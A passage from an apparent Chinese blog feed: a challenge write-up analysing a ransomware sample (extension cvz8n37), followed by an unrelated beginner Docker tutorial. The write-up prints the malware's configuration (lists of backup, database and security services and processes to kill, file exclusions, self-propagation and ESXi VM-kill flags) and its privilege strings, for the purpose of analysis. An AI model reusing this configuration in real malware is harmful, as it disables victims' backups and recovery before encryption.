class="punctuation">,</span></span><br><span class="line">        <span class="string">&quot;GxCVD&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="string">&quot;GxCIMgr&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="string">&quot;GXMMM&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="string">&quot;GxVssHWProv&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="string">&quot;GxFWD&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="string">&quot;SAPService&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="string">&quot;SAP&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="string">&quot;SAP$&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="string">&quot;SAPD$&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="string">&quot;SAPHostControl&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="string">&quot;SAPHostExec&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="string">&quot;QBCFMonitorService&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="string">&quot;QBDBMgrN&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="string">&quot;QBIDPService&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="string">&quot;AcronisAgent&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="string">&quot;VeeamNFSSvc&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="string">&quot;VeeamDeploymentService&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="string">&quot;VeeamTransportSvc&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="string">&quot;MVArmor&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="string">&quot;MVarmor64&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="string">&quot;VSNAPVSS&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="string">&quot;AcrSch2Svc&quot;</span></span><br><span class="line">    <span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;kill_processes&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">        <span class="string">&quot;agntsvc&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="string">&quot;dbeng50&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="string">&quot;dbsnmp&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="string">&quot;encsvc&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="string">&quot;excel&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="string">&quot;firefox&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="string">&quot;infopath&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="string">&quot;isqlplussvc&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="string">&quot;msaccess&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="string">&quot;mspub&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="string">&quot;mydesktopqos&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="string">&quot;mydesktopservice&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="string">&quot;notepad&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="string">&quot;ocautoupds&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="string">&quot;ocomm&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="string">&quot;ocssd&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="string">&quot;onenote&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="string">&quot;oracle&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="string">&quot;outlook&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="string">&quot;powerpnt&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="string">&quot;sqbcoreservice&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="string">&quot;sql&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="string">&quot;steam&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="string">&quot;synctime&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="string">&quot;tbirdconfig&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="string">&quot;thebat&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="string">&quot;thunderbird&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="string">&quot;visio&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="string">&quot;winword&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="string">&quot;wordpad&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="string">&quot;xfssvccon&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="string">&quot;*sql*&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="string">&quot;bedbh&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="string">&quot;vxmon&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="string">&quot;benetns&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="string">&quot;bengien&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="string">&quot;pvlsvr&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="string">&quot;beserver&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="string">&quot;raw_agent_svc&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="string">&quot;vsnapvss&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="string">&quot;CagService&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="string">&quot;QBIDPService&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="string">&quot;QBDBMgrN&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="string">&quot;QBCFMonitorService&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="string">&quot;SAP&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="string">&quot;TeamViewer_Service&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="string">&quot;TeamViewer&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="string">&quot;tv_w32&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="string">&quot;tv_x64&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="string">&quot;CVMountd&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="string">&quot;cvd&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="string">&quot;cvfwd&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="string">&quot;CVODS&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="string">&quot;saphostexec&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="string">&quot;saposcol&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="string">&quot;sapstartsrv&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="string">&quot;avagent&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="string">&quot;avscc&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="string">&quot;DellSystemDetect&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="string">&quot;EnterpriseClient&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="string">&quot;VeeamNFSSvc&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="string">&quot;VeeamTransportSvc&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="string">&quot;VeeamDeploymentSvc&quot;</span></span><br><span class="line">    <span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;exclude_directory_names&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">        <span class="string">&quot;system volume information&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="string">&quot;intel&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="string">&quot;$windows.~ws&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="string">&quot;application data&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="string">&quot;$recycle.bin&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="string">&quot;mozilla&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="string">&quot;$windows.~bt&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="string">&quot;public&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="string">&quot;msocache&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="string">&quot;windows&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="string">&quot;default&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="string">&quot;all users&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="string">&quot;tor browser&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="string">&quot;programdata&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="string">&quot;boot&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="string">&quot;config.msi&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="string">&quot;google&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="string">&quot;perflogs&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="string">&quot;appdata&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="string">&quot;windows.old&quot;</span></span><br><span class="line">    <span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;exclude_file_names&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">        <span class="string">&quot;desktop.ini&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="string">&quot;autorun.inf&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="string">&quot;ntldr&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="string">&quot;bootsect.bak&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="string">&quot;thumbs.db&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="string">&quot;boot.ini&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="string">&quot;ntuser.dat&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="string">&quot;GASS_SYS.sys&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="string">&quot;bootfont.bin&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="string">&quot;ntuser.ini&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="string">&quot;ntuser.dat.log&quot;</span></span><br><span class="line">    <span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;exclude_file_extensions&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">        <span class="string">&quot;themepack&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="string">&quot;nls&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="string">&quot;diagpkg&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="string">&quot;msi&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="string">&quot;lnk&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="string">&quot;exe&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="string">&quot;cab&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="string">&quot;scr&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="string">&quot;bat&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="string">&quot;drv&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="string">&quot;rtp&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="string">&quot;msp&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="string">&quot;prf&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="string">&quot;msc&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="string">&quot;ico&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="string">&quot;key&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="string">&quot;ocx&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="string">&quot;diagcab&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="string">&quot;diagcfg&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="string">&quot;pdb&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="string">&quot;wpx&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="string">&quot;hlp&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="string">&quot;icns&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="string">&quot;rom&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="string">&quot;dll&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="string">&quot;msstyles&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="string">&quot;mod&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="string">&quot;ps1&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="string">&quot;ics&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="string">&quot;hta&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="string">&quot;bin&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="string">&quot;cmd&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="string">&quot;ani&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="string">&quot;386&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="string">&quot;lock&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="string">&quot;cur&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="string">&quot;idx&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="string">&quot;sys&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="string">&quot;com&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="string">&quot;deskthemepack&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="string">&quot;shs&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="string">&quot;ldf&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="string">&quot;theme&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="string">&quot;mpa&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="string">&quot;nomedia&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="string">&quot;spl&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="string">&quot;cpl&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="string">&quot;adv&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="string">&quot;icl&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="string">&quot;msu&quot;</span></span><br><span class="line">    <span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;exclude_file_path_wildcard&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span><span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;enable_network_discovery&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;enable_self_propagation&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;enable_set_wallpaper&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;enable_esxi_vm_kill&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;enable_esxi_vm_snapshot_kill&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;strict_include_paths&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span><span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;esxi_vm_kill_exclude&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span><span class="punctuation">]</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
</details>

<p><img src="/2025/04/17/cvz8n37/image-20250417192952185.png" alt="image-20250417192952185"></p>
<p>只找到了这里有一个txt，感觉应该是这个</p>
<p>放到沙箱里也能跑出来</p>
<p><img src="/2025/04/17/cvz8n37/image-20250418101946666.png" alt="image-20250418101946666"></p>
<blockquote>
<p>RECOVER-CVZ8N37-FILES.TXT</p>
</blockquote>
<h2 id="4-该程序获取计算机名时使用的kernel32库函数是什么？（答案格式：kernel32-xxx）-2-0分"><a href="#4-该程序获取计算机名时使用的kernel32库函数是什么？（答案格式：kernel32-xxx）-2-0分" class="headerlink" title="4.该程序获取计算机名时使用的kernel32库函数是什么？（答案格式：kernel32.xxx） (2.0分)"></a>4.该程序获取计算机名时使用的kernel32库函数是什么？（答案格式：kernel32.xxx） (2.0分)</h2><p>kernel32模块中的<code>GetComputerName</code>模块是用来获取电脑名的</p>
<p>搜一下，然后查找一下引用，使用的是<code>GetComputerNameW</code>函数</p>
<p><img src="/2025/04/17/cvz8n37/image-20250417193337029.png" alt="image-20250417193337029"></p>
<blockquote>
<p>kernel32.GetComputerNameW</p>
</blockquote>
<h2 id="5-根据该程序的加密过程逻辑，已知加密文件后缀为cvz8n37，且系统中存在core-code-c文件，请写出程序在加密该文件前生成的文件名。（答案格式：xxx-cvz8n37）-3-0分"><a href="#5-根据该程序的加密过程逻辑，已知加密文件后缀为cvz8n37，且系统中存在core-code-c文件，请写出程序在加密该文件前生成的文件名。（答案格式：xxx-cvz8n37）-3-0分" class="headerlink" title="5.根据该程序的加密过程逻辑，已知加密文件后缀为cvz8n37，且系统中存在core_code.c文件，请写出程序在加密该文件前生成的文件名。（答案格式：xxx.cvz8n37） (3.0分)"></a>5.根据该程序的加密过程逻辑，已知加密文件后缀为cvz8n37，且系统中存在core_code.c文件，请写出程序在加密该文件前生成的文件名。（答案格式：xxx.cvz8n37） (3.0分)</h2><p><img src="/2025/04/17/cvz8n37/image-20250417200041224.png" alt="image-20250417200041224"></p>
<p>不知道为什么抓不出来，但是答案是这个↓ ↓ ↓ ↓ ↓</p>
<blockquote>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">checkpoints-core_code.c.cvz8n37</span><br></pre></td></tr></table></figure>
</blockquote>
<h2 id="6-该程序在提权过程中会申请多项Windows权限，请写出尝试申请的第三项权限名。（答案格式：答案格式需与实际一致）-4-0分"><a href="#6-该程序在提权过程中会申请多项Windows权限，请写出尝试申请的第三项权限名。（答案格式：答案格式需与实际一致）-4-0分" class="headerlink" title="6.该程序在提权过程中会申请多项Windows权限，请写出尝试申请的第三项权限名。（答案格式：答案格式需与实际一致） (4.0分)"></a>6.该程序在提权过程中会申请多项Windows权限，请写出尝试申请的第三项权限名。（答案格式：答案格式需与实际一致） (4.0分)</h2><p>搜一下<code>Privilege</code> </p>
<p><img src="/2025/04/17/cvz8n37/image-20250417200330356.png" alt="image-20250417200330356"></p>
<p>试了一下第三个，但是不对，又试了一下第二个，发现对了</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SeSecurityPrivilegeSeSystemProfilePrivilegeSeLoadDriverPrivilegeSeTakeOwnershipPrivilegeSeSystemtimePrivilegeSeProfileSingleProcessPrivilegeSeIncreaseBasePriorityPrivilegeSeCreatePagefilePrivilegeSeBackupPrivilegeSeRestorePrivilegeSeShutdownPrivilegeSeDebugPrivilegeSeSystemEnvironmentrivilegeSeChangeNotifyPrivilegeSeRemoteShutdownPrivilegeSeUndockPrivilegSeManageVolumePrivilegeSeImpersonatePrivilegeSeCreateGlobalPrivilegeSeIncreaseWorkingSetPrivilegeSeTimeZonePrivilegeSeCreateSymbolicLinkPrivilegeSeDelegateSessionUserImpersonatePrivilegeSeIncreaseQuotaPrivilege--no-prop-servers--propagatedpropagate::server=N8h</span><br></pre></td></tr></table></figure>

<p><img src="/2025/04/17/cvz8n37/image-20250417200932139.png" alt="image-20250417200932139"></p>
<blockquote>
<p>SeSystemProfilePrivilege</p>
</blockquote>
<h2 id="7-该程序运行过程中获取UUID时的完整命令为？-答案格式：”D-xxx…-xxx-exe”-xx-“xxx-xxx-xxx-xxx”-4-0分"><a href="#7-该程序运行过程中获取UUID时的完整命令为？-答案格式：”D-xxx…-xxx-exe”-xx-“xxx-xxx-xxx-xxx”-4-0分" class="headerlink" title="7.该程序运行过程中获取UUID时的完整命令为？(答案格式：”D:\xxx…\xxx.exe” xx “xxx xxx xxx xxx” (4.0分)"></a>7.该程序运行过程中获取UUID时的完整命令为？(答案格式：”D:\xxx…\xxx.exe” xx “xxx xxx xxx xxx” (4.0分)</h2><p>放到沙箱里查看一下</p>
<p><img src="/2025/04/17/cvz8n37/image-20250418102104916.png" alt="image-20250418102104916"></p>
<blockquote>
<p>“C:\Windows\system32\cmd.exe” &#x2F;c “wmic csproduct get UUID”</p>
</blockquote>
<h2 id="8-该程序存在着默认配置文件，在该配置文件中默认不加密且文件后缀为sys的文件名是？（答案格式：包含后缀名，如xxxx-sys）-4-0分"><a href="#8-该程序存在着默认配置文件，在该配置文件中默认不加密且文件后缀为sys的文件名是？（答案格式：包含后缀名，如xxxx-sys）-4-0分" class="headerlink" title="8.该程序存在着默认配置文件，在该配置文件中默认不加密且文件后缀为sys的文件名是？（答案格式：包含后缀名，如xxxx.sys） (4.0分)"></a>8.该程序存在着默认配置文件，在该配置文件中默认不加密且文件后缀为sys的文件名是？（答案格式：包含后缀名，如xxxx.sys） (4.0分)</h2><p>在exclude_file_names中，看到这个GASS_SYS.sys被排除了</p>
<p><img src="/2025/04/17/cvz8n37/image-20250418103107419.png" alt="image-20250418103107419"></p>
<h2 id="9-请写出该程序加密文件过程中，生成私钥函数返回值内”chipher”键对应的值。-6-0分"><a href="#9-请写出该程序加密文件过程中，生成私钥函数返回值内”chipher”键对应的值。-6-0分" class="headerlink" title="9.请写出该程序加密文件过程中，生成私钥函数返回值内”chipher”键对应的值。 (6.0分)"></a>9.请写出该程序加密文件过程中，生成私钥函数返回值内”chipher”键对应的值。 (6.0分)</h2><p>在.tls段有一个<code>55C3-5171-4C53-0439</code>，能直接在字符串中搜到，具体是什么用不太清楚</p>
]]></content>
  </entry>
  <entry>
    <title>docker</title>
    <url>/2025/10/09/docker/</url>
    <content><![CDATA[<p>Docker学习</p>
<span id="more"></span>

<h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><p><a href="https://get.docker.com/">Docker 下载</a></p>
<p>这里使用树莓派</p>
<p><img src="/2025/10/09/docker/image-20251009164107370.png" alt="image-20251009164107370"></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Usage</span></span><br><span class="line"><span class="comment"># ==============================================================================</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># To install the latest stable versions of Docker CLI, Docker Engine, and their</span></span><br><span class="line"><span class="comment"># dependencies:</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># 1. download the script</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment">#   $ curl -fsSL https://get.docker.com -o install-docker.sh</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># 2. verify the script&#x27;s content</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment">#   $ cat install-docker.sh</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># 3. run the script with --dry-run to verify the steps it executes</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment">#   $ sh install-docker.sh --dry-run</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># 4. run the script either as root, or using sudo to perform the installation.</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment">#   $ sudo sh install-docker.sh</span></span><br></pre></td></tr></table></figure>

<p>把第一条和第四条执行以下，下载不了的话就挂梯子</p>
<p><img src="/2025/10/09/docker/image-20251009170007035.png" alt="image-20251009170007035"></p>
<p><img src="/2025/10/09/docker/image-20251009171313980.png" alt="image-20251009171313980"></p>
<p><img src="/2025/10/09/docker/image-20251009171410289.png" alt="image-20251009171410289"></p>
<h2 id="命令"><a href="#命令" class="headerlink" title="命令"></a>命令</h2><h3 id="docker-pull"><a href="#docker-pull" class="headerlink" title="docker pull"></a>docker pull</h3><p>此命令用来从仓库下载镜像</p>
<h3 id="docker-images"><a href="#docker-images" class="headerlink" title="docker images"></a>docker images</h3><p>此命令用户列出所有下载过的docker镜像</p>
<h3 id="docker-rmi"><a href="#docker-rmi" class="headerlink" title="docker rmi"></a>docker rmi</h3><p>此命令用户删除一个docker镜像，docker remove image</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker rmi &lt;ID/REPOSITORY&gt;</span><br></pre></td></tr></table></figure>

<img src="/2025/10/09/docker/image-20251009172254420.png" alt="image-20251009172254420" style="zoom:50%;">

<h3 id="docker-run"><a href="#docker-run" class="headerlink" title="docker run"></a>docker run</h3><p>此命令用于创建并运行一个容器</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker run -d</span><br></pre></td></tr></table></figure>

<p>detached mode，可以不阻塞当前窗口，在后台运行</p>
<p>运行docker run 命令时，如果镜像不存在，那么会自动拉取</p>
<p>-p 80:80</p>
<img src="/2025/10/09/docker/image-20251009173247876.png" alt="image-20251009173247876" style="zoom:50%;">

<p><img src="/2025/10/09/docker/image-20251009174301335.png" alt="image-20251009174301335"></p>
<p><img src="/2025/10/09/docker/image-20251009174341017.png" alt="image-20251009174341017"></p>
<p>-v 挂载目录</p>
<p><img src="/2025/10/09/docker/image-20251009192811928.png" alt="image-20251009192811928"></p>
<p>在我的宿主机上有一个apache服务器，docker里面又启动了一个nginx服务器，我要nginx也是用apache的服务器内容，就可以这样挂载，宿主机和容器对文件的修改都会影响宿主机原本的文件内容。</p>
<h3 id="docker-ps"><a href="#docker-ps" class="headerlink" title="docker ps"></a>docker ps</h3><p>查看已下载的镜像</p>
<p><img src="/2025/10/09/docker/image-20251009174624925.png" alt="image-20251009174624925"></p>
<h3 id="docker-inspect"><a href="#docker-inspect" class="headerlink" title="docker inspect"></a>docker inspect</h3><p>查看容器信息</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">[</span></span><br><span class="line">    <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;Id&quot;</span><span class="punctuation">:</span> <span class="string">&quot;bb0ed63e5343b2909ade17a4d7b32f57e64fb9cb3a62d8f09ae5194fb6e2ec84&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;Created&quot;</span><span class="punctuation">:</span> <span class="string">&quot;2025-10-09T11:26:53.091560762Z&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;Path&quot;</span><span class="punctuation">:</span> <span class="string">&quot;/docker-entrypoint.sh&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;Args&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">            <span class="string">&quot;nginx&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="string">&quot;-g&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="string">&quot;daemon off;&quot;</span></span><br><span class="line">        <span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;State&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">            <span class="attr">&quot;Status&quot;</span><span class="punctuation">:</span> <span class="string">&quot;running&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;Running&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;Paused&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">false</span></span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;Restarting&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">false</span></span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;OOMKilled&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">false</span></span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;Dead&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">false</span></span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;Pid&quot;</span><span class="punctuation">:</span> <span class="number">1041051</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;ExitCode&quot;</span><span class="punctuation">:</span> <span class="number">0</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;Error&quot;</span><span class="punctuation">:</span> <span class="string">&quot;&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;StartedAt&quot;</span><span class="punctuation">:</span> <span class="string">&quot;2025-10-09T11:47:32.182875692Z&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;FinishedAt&quot;</span><span class="punctuation">:</span> <span class="string">&quot;2025-10-09T11:39:32.692162936Z&quot;</span></span><br><span class="line">        <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;Image&quot;</span><span class="punctuation">:</span> <span 